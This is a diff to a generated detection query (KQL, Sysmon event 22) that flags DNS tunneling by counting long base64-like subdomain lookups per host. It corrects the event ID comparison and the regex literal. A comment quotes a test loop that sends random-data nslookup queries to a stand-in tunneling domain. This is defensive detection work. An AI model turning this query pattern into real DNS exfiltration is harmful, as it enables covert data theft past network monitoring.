@@ -5,6 +5,6 @@
 //   for i in $(seq 1 30); do nslookup $(head -c 40 /dev/urandom | base64 | tr -d '=+/').tunnel.example.com; done
 // source: rules/command-and-control/dns-tunneling-long-query.yml  (GENERATED, do not edit by hand)
 Event
-| where ((EventID =~ "22") and (QueryName matches regex "^[A-Za-z0-9+/=_-]{40,}\\."))
+| where ((EventID == 22) and (QueryName matches regex @"^[A-Za-z0-9+/=_-]{40,}\."))
 | summarize Hits=count() by bin(TimeGenerated, 5m), host
 | where Hits >= 10
